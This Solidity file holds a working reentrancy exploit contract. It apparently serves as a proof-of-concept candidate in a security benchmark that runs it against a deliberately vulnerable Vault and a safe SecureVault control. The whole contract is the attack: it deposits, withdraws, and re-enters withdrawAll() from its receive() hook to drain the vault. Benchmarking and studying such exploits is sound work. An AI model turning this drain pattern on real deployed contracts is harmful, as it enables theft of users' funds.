// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VaultReentrancyExploit
 * @notice A deterministic proof-of-concept candidate for the Checks-Effects-Interactions
 *         violation of the repository's `Vault` benchmark target.
 *
 * WHAT THIS FILE IS
 * -----------------
 * This is the **attacker's** code - the candidate that the immutable, repository-owned
 * trusted harness evaluates inside the EVM. It is *not* a verdict and it never states
 * one. The harness alone decides whether the security invariant of the target was
 * breached, and it does so from the structured Foundry result of its own test
 * (`core/evidence.py`, `sandbox/runner.py`).
 *
 * The candidate is deliberately written against a **target-agnostic** interface: the
 * target contract is reached through plain ABI calls, so the very same candidate can be
 * executed against the vulnerable target (`Vault`) and against the safe control
 * (`SecureVault`). A candidate that only ever confirmed a breach would be worthless as
 * evidence, so the registry pairs both targets with this one file.
 *
 * THE EXPLOIT
 * -----------
 * `Vault.withdrawAll()` performs the external value transfer *before* it updates the
 * depositor's balance (Checks-Effects-Interactions violation). The candidate deposits a
 * budget, withdraws it, and re-enters `withdrawAll()` from its `receive()` hook for as
 * long as the vault still holds at least the attacker's own deposit. Every re-entrant
 * withdrawal pays out the *same* (not yet zeroed) balance, so the attacker drains the
 * vault while the victim keeps a claim that the vault can no longer honour.
 *
 * The re-entry stops as soon as the vault cannot pay another full withdrawal, so no
 * sub-call reverts and the drain itself is not rolled back.
 */
contract ExploitModule {
    /// @notice The audited contract, reached only through its ABI.
    address public vault;

    constructor(address vaultAddress) {
        vault = vaultAddress;
    }

    /**
     * @notice Entry point invoked by the trusted harness with the attacker budget.
     */
    function runExploit() external payable {
        require(msg.value > 0, "ExploitModule: an attack budget is required");

        (bool ok, ) = vault.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(ok, "ExploitModule: deposit() failed");

        (ok, ) = vault.call(abi.encodeWithSignature("withdrawAll()"));
        require(ok, "ExploitModule: withdrawAll() failed");
    }

    /**
     * @notice Re-entrancy hook: the vault pays us before it updates our balance.
     */
    receive() external payable {
        uint256 owed = _balanceOf(address(this));
        if (owed > 0 && address(vault).balance >= owed) {
            (bool ok, ) = vault.call(abi.encodeWithSignature("withdrawAll()"));
            require(ok, "ExploitModule: re-entrant withdrawAll() failed");
        }
    }

    /**
     * @notice Reads the depositor balance of the target through its public getter.
     */
    function _balanceOf(address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = vault.staticcall(
            abi.encodeWithSignature("balances(address)", account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }
}

